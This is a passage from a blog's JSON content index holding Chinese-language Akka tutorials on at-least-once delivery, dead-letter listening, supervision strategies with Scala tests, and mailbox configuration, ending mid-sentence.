List&lt;UnconfirmedDelivery&gt; list = ((UnconfirmedWarning) message).getUnconfirmedDeliveries(); for (UnconfirmedDelivery unconfirmedDelivery : list) &#123; Msg msg = (Msg) unconfirmedDelivery.getMessage(); confirmDelivery(msg.deliveryId); &#125; &#125; else &#123; unhandled(message); &#125; &#125; @Override public void onReceiveRecover(Object event) &#123; updateState(event); &#125; void updateState(Object event) &#123; if (event instanceof MsgSent) &#123; final MsgSent evt = (MsgSent) event; deliver(destination, new Function&lt;Long, Object&gt;() &#123; public Object apply(Long deliveryId) &#123; return new Msg(deliveryId, evt.s); &#125; &#125;); &#125; else if (event instanceof MsgConfirmed) &#123; final MsgConfirmed evt = (MsgConfirmed) event; confirmDelivery(evt.deliveryId); &#125; &#125;&#125; 正如我们之前所述——要使用at-least-once的能力，就必须继承UntypedPersistentActorWithAtLeastOnceDelivery。有关MsgSent、Msg、Confirm及MsgConfirmed等消息的处理过程已经介绍过，这里不再赘述。我们注意到onReceiveCommand方法还处理了一种名为UnconfirmedWarning的消息，这类消息将在at-least-once机制下进行无限或者一定数量的投递尝试后发送给当前Actor，这里的数量可以通过在at-least-once-delivery配置中增加配置项warn-after-number-of-unconfirmed-attempts来调整，例如： 123456at-least-once-delivery &#123; redeliver-interval = 20000 redelivery-burst-limit = 100 warn-after-number-of-unconfirmed-attempts = 6&#125; 当你收到UnconfirmedWarning的消息时，说明已经超出了你期望的最大重试次数，此时可以做一些控制了，例如：对于这些消息发送报警、丢弃等。本例中选择了丢弃。​ UntypedPersistentActorWithAtLeastOnceDelivery的状态由那些尚未被确认的消息和一个序列号组成。UntypedPersistentActorWithAtLeastOnceDelivery本身不会存储这些状态，依然需要你在调用deliver方法投递消息之前，调用persist方法持久化这些事件或消息，以便于当持久化Actor能够在恢复阶段恢复。在恢复阶段，deliver方法并不会将发出消息，此时持久化Actor一面恢复，一面只能等待接收回复。当恢复完成，deliver将发送那些被缓存的消息（除了收到回复，并调用confirmDelivery方法的消息）。 4.3.运行例子本文将率先启动客户端并向服务端发送hello-1，hello-2，hello-3这三消息，但是由于服务端此时并未启动，所以客户端会不断重试，直到重试达到上限或者受到回复并确认。服务端发送消息的代码如下： 123456789logger.info(&quot;Start myPersistentActor&quot;);final String path = &quot;akka.tcp://metadataAkkaSystem@127.0.0.1:2551/user/myDestination&quot;;final ActorSelection destination = actorSystem.actorSelection(path);final ActorRef myPersistentActor = actorSystem.actorOf(springExt.props(&quot;MyPersistentActor&quot;, destination), &quot;myPersistentActor&quot;);actorMap.put(&quot;myPersistentActor&quot;, myPersistentActor);logger.info(&quot;Started myPersistentActor&quot;);myPersistentActor.tell(&quot;hello-1&quot;, null);myPersistentActor.tell(&quot;hello-2&quot;, null);myPersistentActor.tell(&quot;hello-3&quot;, null); 客户端发送三条消息后，日志中立马打印出了以下内容：但是一直未受到回复信息，然后我们启动服务端，不一会就看到了以下日志输出：我们再来看看客户端，发现已经收到了回复，内容如下： 4.4.总结通过使用UntypedPersistentActorWithAtLeastOnceDelivery提供的persist、deliver及confirmDelivery等方法可以对整个应用的at-least-once需求，轻松实现在框架层面上一致的实现。 参考​https://blog.csdn.net/beliefer/article/details/53929751","categories":[{"name":"network","slug":"network","permalink":"https://wuhaocn.github.io/categories/network/"}],"tags":[{"name":"akka","slug":"akka","permalink":"https://wuhaocn.github.io/tags/akka/"}]},{"title":"Akka-Actor-DeadLetter监听","slug":"network/akka/Akka-Actor-DeadLetter监听","date":"2021-12-03T08:22:48.138Z","updated":"2021-12-03T09:07:15.168Z","comments":true,"path":"2021/12/03/network/akka/Akka-Actor-DeadLetter监听/","link":"","permalink":"https://wuhaocn.github.io/2021/12/03/network/akka/Akka-Actor-DeadLetter%E7%9B%91%E5%90%AC/","excerpt":"","text":"1.自定义监听actor12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849import akka.actor.UntypedActor;import org.apache.commons.lang3.concurrent.BasicThreadFactory;import java.util.ArrayList;import java.util.Collections;import java.util.List;import java.util.concurrent.ScheduledExecutorService;import java.util.concurrent.ScheduledThreadPoolExecutor;import java.util.concurrent.TimeUnit;/** * @author wuhao * @createTime 2021-09-26 17:06:00 */public class DeadLetterActor extends UntypedActor &#123; private static int CLEAN_TIME = 5; private static int MAX_DEAD_LETTER = 1000; private static List&lt;Object&gt; deadLetterList = Collections.synchronizedList(new ArrayList()); private static ScheduledExecutorService scheduledExecutorService = new ScheduledThreadPoolExecutor(1, new BasicThreadFactory.Builder().namingPattern(&quot;dead-letter-schedule-pool-%d&quot;).daemon(true).build()); static &#123; scheduledExecutorService.scheduleAtFixedRate(new Runnable() &#123; @Override public void run() &#123; deadLetterList.clear(); &#125; &#125;, CLEAN_TIME, CLEAN_TIME, TimeUnit.MINUTES); &#125; @Override public void onReceive(Object message) throws Throwable &#123; addDeadLetter(message); &#125; public static void addDeadLetter(Object message) &#123; if (deadLetterList.size() &lt; MAX_DEAD_LETTER) &#123; deadLetterList.add(message); &#125; &#125; public static List&lt;Object&gt; getDeadLetter() &#123; return deadLetterList; &#125;&#125; 2.监听actor12ActorRef deadLetterRef = akka.actorOf(Props.create(DeadLetterActor.class), &quot;remoting-profiler-deadletter&quot;);akka.eventStream().subscribe(deadLetterRef, DeadLetter.class);","categories":[{"name":"network","slug":"network","permalink":"https://wuhaocn.github.io/categories/network/"}],"tags":[{"name":"akka","slug":"akka","permalink":"https://wuhaocn.github.io/tags/akka/"}]},{"title":"Akka-Actor-监管与容错","slug":"network/akka/Akka-Actor-监管与容错","date":"2021-12-03T08:22:40.247Z","updated":"2021-12-03T09:07:15.131Z","comments":true,"path":"2021/12/03/network/akka/Akka-Actor-监管与容错/","link":"","permalink":"https://wuhaocn.github.io/2021/12/03/network/akka/Akka-Actor-%E7%9B%91%E7%AE%A1%E4%B8%8E%E5%AE%B9%E9%94%99/","excerpt":"","text":"1.概述 Akka作为一种成熟的生产环境并发解决方案，必须拥有一套完善的错误异常处理机制，本文主要讲讲Akka中的监管和容错。 2.监管 Akka中的Actor系统它的很重要的概念就是分而治之，既然我们把任务分配给Actor去执行，那么我们必须去监管相应的Actor，当Actor出现了失败，比如系统环境错误，各种异常，能根据我们制定的相应监管策略进行错误恢复，就是后面我们会说到的容错。 2.1 监管者既然有监管这一事件，那必然存在着**监管者**这么一个角色，那么在ActorSystem中是如何确定这种角色的呢？ 我们先来看下ActorSystem中的顶级监管者： 一个actor系统在其创建过程中至少要启动三个actor，如上图所示，下面来说说这三个Actor的功能： 2.1.1. 根监管者 /:顾名思义，它是一个老大，它监管着ActorSystem中所有的顶级Actor，顶级Actor有以下几种： /user： 是所有由用户创建的顶级actor的监管者；用ActorSystem.actorOf创建的actor在其下。 /system： 是所有由系统创建的顶级actor的监管者，如日志监听器，或由配置指定在actor系统启动时自动部署的actor。 /deadLetters： 是死信actor，所有发往已经终止或不存在的actor的消息会被重定向到这里。 /temp：是所有系统创建的短时actor的监管者，例如那些在ActorRef.ask的实现中用到的actor。 /remote： 是一个人造虚拟路径，用来存放所有其监管者是远程actor引用的actor。 跟我们平常打交道最多的就是/user，它是我们在程序中用ActorSystem.actorOf创建的actor的监管者，下面的容错我们重点关心的就是它下面的失败处理，其他几种顶级Actor具体功能定义已经给出，有兴趣的也可以去了解一下。 根监管者监管着所有顶级Actor，对它们的各种失败情况进行处理，一般来说如果错误要上升到根监管者，整个系统就会停止。 2.1.2. 顶级actor监管者 /user： 上面已经讲过/user是所有由用户创建的顶级actor的监管者，即用ActorSystem.actorOf创建的actor，我们可以自己制定相应的监管策略，但由于它是actor系统启动时就产生的，所以我们需要在相应的配置文件里配置，具体的配置可以参考这里Akka配置​ 2.1.3. 系统监管者 /system：/system所有由系统创建的顶级actor的监管者,比如Akka中的日志监听器，因为在Akka中日志本身也是用Actor实现的，/system的监管策略如下：对收到的除ActorInitializationException和ActorKilledException之外的所有Exception无限地执行重启，当然这也会终止其所有子actor。所有其他Throwable被上升到根监管者，然后整个actor系统将会关闭。 用户创建的普通actor的监管：上一篇文章介绍了Actor系统的组织结构，它是一种树形结构，其实这种结构对actor的监管是非常有利的，Akka实现的是一种叫“父监管”的形式，每一个被创建的actor都由其父亲所监管，这种限制使得actor的监管结构隐式符合其树形结构，所以我们可以得出一个结论： ** 一个被创建的Actor肯定是一个被监管者，也可能是一个监管者，它监管着它的子级Actor**​ 2.2 监管策略 在Akka框架内，父Actor对子Actor进行监督，监控子Actor的行为是否有异常。大体上，监控策略分为两种: OneForOneStrategy策略：父Actor只会对出问题的子Actor进行处理。比如重启或停止。Akka的默认策略，推荐使用。 AllForOneStrategy策略：父Actor会对出问题的子Actor以及它所有的兄弟节点都进行处理。只适用于各个Actor联系非常紧密的场景，如果多个Actor只要有一个失败，则宣布整个任务失败的情况。 Actor中具体的处理方式主要包括以下： 继续（resume） ：Actor 继续处理下一条消息； 停止（stop） ：停 止 Actor，不再做任何操作； 重启（restart） ：新建一个 Actor，代替原来的 Actor； 向上反映（escalate） ：将异常信息传递给下一个监督者。 1234567891011121314151617181920212223public class JavaSupervisorStrategyDemo extends AbstractActor &#123; private static SupervisorStrategy strategy = new OneForOneStrategy( 10, Duration.create(&quot;1 minute&quot;), /* * resume(): Actor 继续处理下一条消息; * restart(): 停 止Actor，不再做任何操作; * escalate(): 新建一个 Actor，代替原来的 Actor; * stop(): 将异常信息传递给下一个监督者; */ DeciderBuilder.match(ArithmeticException.class, e -&gt; SupervisorStrategy.resume()) .match(NullPointerException.class, e -&gt; SupervisorStrategy.restart()) .match(IllegalArgumentException.class, e -&gt; SupervisorStrategy.stop()) .matchAny(o -&gt; SupervisorStrategy.escalate()) .build()); @Override public SupervisorStrategy supervisorStrategy() &#123; return strategy; &#125;&#125; 一对一策略（one-for-one strategy）意味着每个子级都被单独对待。在上面的示例中，10和Duration.create(1, TimeUnit.MINUTES)分别传递给maxNrOfRetries和withinTimeRange参数，这意味着策略每分钟重新启动一个子级最多10次。如果在withinTimeRange持续时间内重新启动计数超过maxNrOfRetries，则子 Actor 将停止。​ 如果策略在监督者 Actor（而不是单独的类）中声明，则其决策者可以线程安全方式访问 Actor 的所有内部状态，包括获取对当前失败的子级的引用，可用作失败消息的getSender()。 默认监督策略 一般情况下使用默认的行为就可以了：如果 Actor 在运行中抛出异常，就重启 Actor；如果发生错误，就向上反映或是关闭应用程序。不过如果 Actor 在构造函数中抛出异常，那么会导致 ActorInitializationException，并最终导致 Actor 停止运行。如果没有为 Actor 定义监督策略，则默认情况下会处理以下异常： ActorInitializationException将停止失败的子 Actor ActorKilledException将停止失败的子 Actor DeathPactException将停止失败的子 Actor Exception将重新启动失败的子 Actor 其他类型的Throwable将向上反映到父级 Actor 如果异常一直升级到根守护者，它将以与上面定义的默认策略相同的方式处理它。 停止监督策略 在子级失败时采取措施阻止他们，然后在DeathWatch显示子级死亡时由监督者采取纠正措施。此策略还预打包为SupervisorStrategy.stoppingStrategy，并附带一个StoppingSupervisorStrategy配置程序，以便在您希望/user下监护人应用它时使用。 记录 Actor 的失败 默认情况下，除非向上反映escalate，否则SupervisorStrategy会记录故障。escalate的故障应该在层次结构中更高的级别处理并记录下来。 通过在实例化时将loggingEnabled设置为false，可以将SupervisorStrategy的默认日志设置为静音。定制的日志记录可以在Decider内完成。 请注意，当在监督者 Actor 内部声明SupervisorStrategy时，对当前失败的子级的引用可用作sender。你还可以通过重写logFailure方法自定义自己的SupervisorStrategy中的日志记录。 3.监管容错示例本示例主要演示Actor在发生错误时，它的监管者会根据相应的监管策略进行不同的处理。源码链接因为这个例子比较简单，这里我直接贴上相应代码，后面根据具体的测试用例来解释各种监管策略所进行的响应： 1234567891011121314151617181920212223242526272829303132333435class Supervisor extends Actor &#123; //监管下属，根据下属抛出的异常进行相应的处理 override val supervisorStrategy = OneForOneStrategy(maxNrOfRetries = 10, withinTimeRange = 1 minute) &#123; case _: ArithmeticException =&gt; Resume case _: NullPointerException =&gt; Restart case _: IllegalArgumentException =&gt; Stop case _: Exception =&gt; Escalate &#125; var childIndex = 0 //用于标示下属Actor的序号 def receive = &#123; case p: Props =&gt; childIndex += 1 //返回一个Child Actor的引用，所以Supervisor Actor是Child Actor的监管者 sender() ! context.actorOf(p,s&quot;child$&#123;childIndex&#125;&quot;) &#125;&#125;class Child extends Actor &#123; val log = Logging(context.system, this) var state = 0 def receive = &#123; case ex: Exception =&gt; throw ex //抛出相应的异常 case x: Int =&gt; state = x //改变自身状态 case s: Command if s.content == &quot;get&quot; =&gt; log.info(s&quot;the $&#123;s.self&#125; state is $&#123;state&#125;&quot;) sender() ! state //返回自身状态 &#125;&#125;case class Command( //相应命令 content: String, self: String) 现在我们来看看具体的测试用例： 首先我们先构建一个测试环境： 123456789101112131415161718class GuardianSpec(_system: ActorSystem) extends TestKit(_system) with WordSpecLike with Matchers with ImplicitSender &#123; def this() = this(ActorSystem(&quot;GuardianSpec&quot;)) &quot;A supervisor&quot; must &#123; &quot;apply the chosen strategy for its child&quot; in &#123; code here... val supervisor = system.actorOf(Props[Supervisor], &quot;supervisor&quot;) //创建一个监管者 supervisor ! Props[Child] val child = expectMsgType[ActorRef] // 从 TestKit 的 testActor 中获取回应 &#125; &#125;&#125; 3.1.TestOne：正常运行123child ! 50 // 将状态设为 50child ! Command(&quot;get&quot;,child.path.name)expectMsg(50) 正常运行，测试通过。​ 3.2.TestTwo：抛出ArithmeticException123child ! new ArithmeticException // crash itchild ! Command(&quot;get&quot;,child.path.name)expectMsg(50) 大家猜这时候测试会通过吗？答案是通过，原因是根据我们制定的监管策略，监管者在面对子级Actor抛出ArithmeticException异常时，它会去恢复相应出异常的Actor，并保持该Actor的状态，所以此时Actor的状态值还是50，测试通过。​ 3.3 TestThree：抛出NullPointerException123child ! new NullPointerException // crash it harderchild ! &quot;get&quot;expectMsg(50) 这种情况下测试还会通过吗？答案是不通过，原因是根据我们制定的监管策略，监管者在面对子级Actor抛出NullPointerException异常时，它会去重启相应出异常的Actor，其状态会被清除，所以此时Actor的状态值应该是0，测试不通过。​ 3.4.TestFour：抛出IllegalArgumentException12345678910supervisor ! Props[Child] // create new childval child2 = expectMsgType[ActorRef]child2 ! 100 // 将状态设为 100watch(child) // have testActor watch “child”child ! new IllegalArgumentException // break itexpectMsgPF() &#123; case Terminated(`child`) =&gt; (println(&quot;the child stop&quot;))&#125;child2 ! Command(&quot;get&quot;,child2.path.name)expectMsg(100) 这里首先我们又创建了一个Child Actor为child2，并将它的状态置为100，这里我们监控前面创建的child1，然后给其发送一个IllegalArgumentException的消息，让其抛出该异常，测试结果:​ 12the child stop 测试通过 ​ 从结果中我们可以看出，child在抛出IllegalArgumentException后，会被其监管着停止，但监管者下的其他Actor还是正常工作。 3.5.TestFive：抛出一个自定义异常12345678910111213 watch(child2) child2 ! Command(&quot;get&quot;,child2.path.name) // verify it is alive expectMsg(100) supervisor ! Props[Child] // create new child val child3 = expectMsgType[ActorRef] child2 ! new Exception(&quot;CRASH&quot;) // escalate failure expectMsgPF() &#123; case t @ Terminated(`child2`) if t.existenceConfirmed =&gt; ( println(&quot;the child2 stop&quot;) )&#125;child3 ! Command(&quot;get&quot;,child3.path.name)expectMsg(0) 这里首先我们又创建了一个Child Actor为child3,这里我们监控前面创建的child2,然后给其发送一个Exception(“CRASH”)的消息，让其抛出该异常,测试结果: 12the child2 stop 测试不通过 很多人可能会疑惑为什么TestFour可以通过，这里就通不过不了呢？因为这里错误Actor抛出的异常其监管者无法处理，只能将失败上溯传递，而顶级actor的缺省策略是对所有的Exception情况（ActorInitializationException和ActorKilledException例外）进行重启. 由于缺省的重启指令会停止所有的子actor，所以我们这里的child3也会被停止。导致测试不通过。当然这里你也可以复写默认的重启方法，比如：​ 1override def preRestart(cause: Throwable, msg: Option[Any]) &#123;&#125; 这样重启相应Actor时就不会停止其子级下的所有Actor了。本文主要介绍了Actor系统中的监管和容错，这一部分内容在Akka中也是很重要的，它与Actor的树形组织结构巧妙结合，本文大量参考了Akka官方文档的相应章节，有兴趣的同学可以点击这里Akka docs。也可以下载我的示例程序，里面包含了一个官方的提供的容错示例。​ 参考​ https://blog.csdn.net/lp284558195/article/details/112466024https://godpan.me/2017/04/15/learning-akka-3.html","categories":[{"name":"network","slug":"network","permalink":"https://wuhaocn.github.io/categories/network/"}],"tags":[{"name":"akka","slug":"akka","permalink":"https://wuhaocn.github.io/tags/akka/"}]},{"title":"Akka-Mailboxes","slug":"network/akka/Akka-Mailboxes","date":"2021-12-03T08:22:13.665Z","updated":"2021-12-03T09:07:15.151Z","comments":true,"path":"2021/12/03/network/akka/Akka-Mailboxes/","link":"","permalink":"https://wuhaocn.github.io/2021/12/03/network/akka/Akka-Mailboxes/","excerpt":"","text":"1.依赖为了使用邮箱（Mailboxes），你需要将以下依赖添加到你的项目中： 1234567891011121314&lt;!-- Maven --&gt;&lt;dependency&gt; &lt;groupId&gt;com.typesafe.akka&lt;/groupId&gt; &lt;artifactId&gt;akka-actor_2.12&lt;/artifactId&gt; &lt;version&gt;2.5.21&lt;/version&gt;&lt;/dependency&gt;&lt;!-- Gradle --&gt;dependencies &#123; compile group: &#x27;com.typesafe.akka&#x27;, name: &#x27;akka-actor_2.12&#x27;, version: &#x27;2.5.21&#x27;&#125;&lt;!-- sbt --&gt;libraryDependencies += &quot;com.typesafe.akka&quot; %% &quot;akka-actor&quot; % &quot;2.5.21&quot; 2.简介Akka 的邮箱中保存着发给 Actor 的信息。通常，每个 Actor 都有自己的邮箱，但也有例外，如使用BalancingPool，则所有路由器（routees）将共享一个邮箱实例。 3.邮箱选择3.1 指定 Actor 的消息队列类型通过让某个 Actor 实现参数化接口RequiresMessageQueue，可以为某个 Actor 类型指定某种类型的消息队列。下面是一个例子： 12345import akka.dispatch.BoundedMessageQueueSemantics;import akka.dispatch.RequiresMessageQueue;public class MyBoundedActor extends MyActor implements RequiresMessageQueue&lt;BoundedMessageQueueSemantics&gt; &#123;&#125; RequiresMessageQueue接口的类型参数需要映射到配置中的邮箱，如下所示： 12345678bounded-mailbox &#123; mailbox-type = &quot;akka.dispatch.NonBlockingBoundedMailbox&quot; mailbox-capacity = 1000 &#125;akka.actor.mailbox.requirements &#123; &quot;akka.dispatch.BoundedMessageQueueSemantics&quot; = bounded-mailbox&#125; 现在，每次创建MyBoundedActor类型的 Actor 时，它都会尝试获取一个有界邮箱。如果 Actor 在部署中配置了不同的邮箱，可以直接配置，也可以通过具有指定邮箱类型的调度器（dispatcher）配置，那么这将覆盖此映射。 注释：接口中的所需类型为 Actor 创建的邮箱中的队列类型，如果队列未实现所需类型，则 Actor 创建将失败。 3.2.指定调度器的消息队列类型调度器还可能需要运行在其上的 Actor 使用的邮箱类型。例如，BalancingDispatcher需要一个消息队列，该队列对于多个并发使用者是线程安全的。这需要对调度器进行配置，如下所示： 123my-dispatcher &#123; mailbox-requirement = org.example.MyInterface&#125; 给定的需求命名一个类或接口，然后确保该类或接口是消息队列实现的父类型。如果发生冲突，例如，如果 Actor 需要不满足此要求的邮箱类型，则 Actor 创建将失败。 3.3.如何选择邮箱类型创建 Actor 时，ActorRefProvider首先确定执行它的调度器。然后确定邮箱如下： 如果 Actor 的部署配置节（section）包含mailbox键，那么它将命名一个描述要使用的邮箱类型的配置节。 如果 Actor 的Props包含邮箱选择（mailbox selection），即对其调用了withMailbox，则该属性将命名一个描述要使用的邮箱类型的配置节。请注意，这需要绝对配置路径，例如myapp.special-mailbox，并且不嵌套在akka命名空间中。 如果调度器的配置节包含mailbox-type键，则将使用相同的节来配置邮箱类型。 如果 Actor 需要如上所述的邮箱类型，则将使用该要求（requirement）的映射来确定要使用的邮箱类型；如果失败，则尝试使用调度器的要求（如果有）。 如果调度器需要如上所述的邮箱类型，那么将使用该要求的映射来确定要使用的邮箱类型。 将使用默认邮箱akka.actor.default-mailbox。3.4.默认邮箱 如果未按上述说明指定邮箱，则使用默认邮箱。默认情况下，它是一个无边界的邮箱，由java.util.concurrent.ConcurrentLinkedQueue支持。 SingleConsumerOnlyUnboundedMailbox是一个效率更高的邮箱，它可以用作默认邮箱，但不能与BalancingDispatcher一起使用。 将SingleConsumerOnlyUnboundedMailbox配置为默认邮箱： 123akka.actor.default-mailbox &#123; mailbox-type = &quot;akka.dispatch.SingleConsumerOnlyUnboundedMailbox&quot;&#125; 3.5.将哪个配置传递到邮箱类型每个邮箱类型都由一个扩展MailboxType并接受两个构造函数参数的类实现：ActorSystem.Settings对象和Config部分。后者是通过从 Actor 系统的配置中获取命名的配置节、用邮箱类型的配置路径覆盖其id键并添加回退（fall-back）到默认邮箱配置节来计算的。 4.内置邮箱实现Akka 附带了许多邮箱实现： UnboundedMailbox（默认） 默认邮箱 由java.util.concurrent.ConcurrentLinkedQueue支持 是否阻塞：No 是否有界：No 配置名称：unbounded或akka.dispatch.UnboundedMailbox SingleConsumerOnlyUnboundedMailbox，此队列可能比默认队列快，也可能不比默认队列快，具体取决于你的用例，请确保正确地进行基准测试！ 由多个生产商单个使用者队列支持，不能与BalancingDispatcher一起使用 是否阻塞：No 是否有界：No 配置名称：akka.dispatch.SingleConsumerOnlyUnboundedMailbox NonBlockingBoundedMailbox 由一个非常高效的”多生产者，单消费者“队列支持 是否阻塞：No（将溢出的消息丢弃为deadLetters） 是否有界：Yes 配置名称：akka.dispatch.NonBlockingBoundedMailbox UnboundedControlAwareMailbox 传递以更高优先级扩展akka.dispatch.ControlMessage的消息 由两个java.util.concurrent.ConcurrentLinkedQueue支持 是否阻塞：No 是否有界：No 配置名称：akka.dispatch.UnboundedControlAwareMailbox UnboundedPriorityMailbox 由java.util.concurrent.PriorityBlockingQueue支持 等优先级邮件的传递顺序未定义，与UnboundedStablePriorityMailbox相反 是否阻塞：No 是否有界：No 配置名称：akka.dispatch.UnboundedPriorityMailbox UnboundedStablePriorityMailbox 由包装在akka.util.PriorityQueueStabilizer中的java.util.concurrent.PriorityBlockingQueue提供支持 对于优先级相同的消息保留FIFO顺序，与UnboundedPriorityMailbox相反 是否阻塞：No 是否有界：No 配置名称：akka.dispatch.UnboundedStablePriorityMailbox 其他有界邮箱实现，如果达到容量并配置了非零mailbox-push-timeout-time超时时间，则会阻止发件人。特别地，以下邮箱只能与零mailbox-push-timeout-time一起使用。 BoundedMailbox 由java.util.concurrent.LinkedBlockingQueue支持 是否阻塞：如果与非零mailbox-push-timeout-time一起使用，则为Yes，否则为NO 是否有界：Yes 配置名称：bounded或akka.dispatch.BoundedMailbox BoundedPriorityMailbox 由包装在akka.util.BoundedBlockingQueue中的java.util.PriorityQueue提供支持 优先级相同的邮件的传递顺序未定义，与BoundedStablePriorityMailbox相反 是否阻塞：如果与非零mailbox-push-timeout-time一起使用，则为Yes，否则为NO 是否有界：Yes 配置名称：akka.dispatch.BoundedPriorityMailbox BoundedStablePriorityMailbox 由包装在akka.util.PriorityQueueStabilizer和akka.util.BoundedBlockingQueue中的java.util.PriorityQueue提供支持 对于优先级相同的消息保留FIFO顺序，与BoundedPriorityMailbox相反 是否阻塞：如果与非零mailbox-push-timeout-time一起使用，则为Yes，否则为NO 是否有界：Yes 配置名称：akka.dispatch.BoundedStablePriorityMailbox BoundedControlAwareMailbox 传递以更高优先级扩展akka.dispatch.ControlMessage的消息 由两个java.util.concurrent.ConcurrentLinkedQueue支持，如果达到容量，则在排队时阻塞 是否阻塞：如果与非零mailbox-push-timeout-time一起使用，则为Yes，否则为NO 是否有界：Yes 配置名称：akka.dispatch.BoundedControlAwareMailbox 5.邮箱配置示例5.1.PriorityMailbox如何创建PriorityMailbox: 12345678910111213141516171819static class MyPrioMailbox extends UnboundedStablePriorityMailbox &#123; // needed for reflective instantiation public MyPrioMailbox(ActorSystem.Settings settings, Config config) &#123; // Create a new PriorityGenerator, lower prio means more important super( new PriorityGenerator() &#123; @Override public int gen(Object message) &#123; if (message.equals(&quot;highpriority&quot;)) return 0; // &#x27;highpriority messages should be treated first if possible else if (message.equals(&quot;lowpriority&quot;)) return 2; // &#x27;lowpriority messages should be treated last if possible else if (message.equals(PoisonPill.getInstance())) return 3; // PoisonPill when no other left else return 1; // By default they go between high and low prio &#125; &#125;); &#125;&#125; 然后将其添加到配置中： 1234prio-dispatcher &#123; mailbox-type = &quot;docs.dispatcher.DispatcherDocSpec$MyPrioMailbox&quot; //Other dispatcher configuration goes here&#125; 下面是一个关于如何使用它的示例： 1234567891011121314151617181920212223242526272829303132333435363738394041424344class Demo extends AbstractActor &#123; LoggingAdapter log = Logging.getLogger(getContext().getSystem(), this); &#123; for (Object msg : new Object[] &#123; &quot;lowpriority&quot;, &quot;lowpriority&quot;, &quot;highpriority&quot;, &quot;pigdog&quot;, &quot;pigdog2&quot;, &quot;pigdog3&quot;, &quot;highpriority&quot;, PoisonPill.getInstance() &#125;) &#123; getSelf().tell(msg, getSelf()); &#125; &#125; @Override public Receive createReceive() &#123; return receiveBuilder() .matchAny( message -&gt; &#123; log.info(message.toString()); &#125;) .build(); &#125;&#125;// We create a new Actor that just prints out what it processesActorRef myActor = system.actorOf(Props.create(Demo.class, this).withDispatcher(&quot;prio-dispatcher&quot;));/*Logs: &#x27;highpriority &#x27;highpriority &#x27;pigdog &#x27;pigdog2 &#x27;pigdog3 &#x27;lowpriority &#x27;lowpriority*/ 也可以这样直接配置邮箱类型（这是顶级配置项）： 12345678910prio-mailbox &#123; mailbox-type = &quot;docs.dispatcher.DispatcherDocSpec$MyPrioMailbox&quot; //Other mailbox configuration goes here&#125;akka.actor.deployment &#123; /priomailboxactor &#123; mailbox = prio-mailbox &#125;&#125; 然后从这样的部署中使用它： 1ActorRef myActor = system.actorOf(Props.create(MyActor.class), &quot;priomailboxactor&quot;); 或者这样的代码： 1ActorRef myActor = system.actorOf(Props.create(MyActor.class).withMailbox(&quot;prio-mailbox&quot;)); 5.2.ControlAwareMailbox如果 Actor 需要立即接收控制消息，无论邮箱中已经有多少其他消息，ControlAwareMailbox都非常有用。 可以这样配置： 1234control-aware-dispatcher &#123; mailbox-type = &quot;akka.dispatch.UnboundedControlAwareMailbox&quot; //Other dispatcher configuration goes here&#125; 控制消息需要扩展ControlMessage特性： 1static class MyControlMessage implements ControlMessage &#123;&#125; 下面是一个关于如何使用它的示例： 12345678910111213141516171819202122232425262728293031class Demo extends AbstractActor &#123; LoggingAdapter log = Logging.getLogger(getContext().getSystem(), this); &#123; for (Object msg : new Object[] &#123;&quot;foo&quot;, &quot;bar&quot;, new MyControlMessage(), PoisonPill.getInstance()&#125;) &#123; getSelf().tell(msg, getSelf()); &#125; &#125; @Override public Receive createReceive() &#123; return receiveBuilder() .matchAny( message -&gt; &#123; log.info(message.toString()); &#125;) .build(); &#125;&#125;// We create a new Actor that just prints out what it processesActorRef myActor = system.actorOf(Props.create(Demo.class, this).withDispatcher(&quot;control-aware-dispatcher&quot;));/*Logs: &#x27;MyControlMessage &#x27;foo &#x27;bar*/ 6.创建自己的邮箱类型示例如下： 12// Marker interface used for mailbox requirements mappingpublic interface MyUnboundedMessageQueueSemantics &#123;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152import akka.actor.ActorRef;import akka.actor.ActorSystem;import akka.dispatch.Envelope;import akka.dispatch.MailboxType;import akka.dispatch.MessageQueue;import akka.dispatch.ProducesMessageQueue;import com.typesafe.config.Config;import java.util.concurrent.ConcurrentLinkedQueue;import java.util.Queue;import scala.Option;public class MyUnboundedMailbox implements MailboxType, ProducesMessageQueue&lt;MyUnboundedMailbox.MyMessageQueue&gt; &#123; // This is the MessageQueue implementation public static class MyMessageQueue implements MessageQueue, MyUnboundedMessageQueueSemantics &#123; private final Queue&lt;Envelope&gt; queue = new ConcurrentLinkedQueue&lt;Envelope&gt;(); // these must be implemented; queue used as example public void enqueue(ActorRef receiver, Envelope handle) &#123; queue.offer(handle); &#125; public Envelope dequeue() &#123; return queue.poll(); &#125; public int numberOfMessages() &#123; return queue.size(); &#125; public boolean hasMessages() &#123; return !queue.isEmpty(); &#125; public void cleanUp(ActorRef owner, MessageQueue deadLetters) &#123; for (Envelope handle : queue) &#123; deadLetters.enqueue(owner, handle); &#125; &#125; &#125; // This constructor signature must exist, it will be called by Akka public MyUnboundedMailbox(ActorSystem.Settings settings, Config config) &#123; // put your initialization code here &#125; // The create method is called to create the MessageQueue public MessageQueue create(Option&lt;ActorRef&gt; owner, Option&lt;ActorSystem&gt; system) &#123; return new MyMessageQueue(); &#125;&#125; 然后，将MailboxType的 FQCN 指定为调度器配置或邮箱配置中mailbox-type的值。 注释：请确保包含一个采用akka.actor.ActorSystem.Settings和com.typesafe.config.Config参数的构造函数，因为此构造函数是通过反射调用来构造邮箱类型的。作为第二个参数传入的配置是配置中描述使用此邮箱类型的调度器或邮箱设置的部分；邮箱类型将为使用它的每个调度器或邮箱设置实例化一次。 你还可以使用邮箱作为调度器的要求（requirement），如下所示： 12345678910111213custom-dispatcher &#123; mailbox-requirement = &quot;jdocs.dispatcher.MyUnboundedMessageQueueSemantics&quot;&#125;akka.actor.mailbox.requirements &#123; &quot;jdocs.dispatcher.MyUnboundedMessageQueueSemantics&quot; = custom-dispatcher-mailbox&#125;custom-dispatcher-mailbox &#123; mailbox-type = &quot;jdocs.dispatcher.MyUnboundedMailbox&quot;&#125; 或者像这样定义 Actor 类的要求： 1234static class MySpecialActor extends AbstractActor implements RequiresMessageQueue&lt;MyUnboundedMessageQueueSemantics&gt; &#123; // ...&#125; 7.system.actorOf 的特殊语义为了使system.actorOf既同步又不阻塞，同时保持返回类型ActorRef（以及返回的ref完全起作用的语义），对这种情况进行了特殊处理。在幕后，构建了一种空的 Actor 引用，将其发送给系统的守护者 Actor，该 Actor 实际上创建了 Actor 及其上下文，并将其放入引用中。在这之前，发送到ActorRef的消息将在本地排队，只有在交换真正的填充之后，它们才会被传输到真正的邮箱中。因此， 1234final 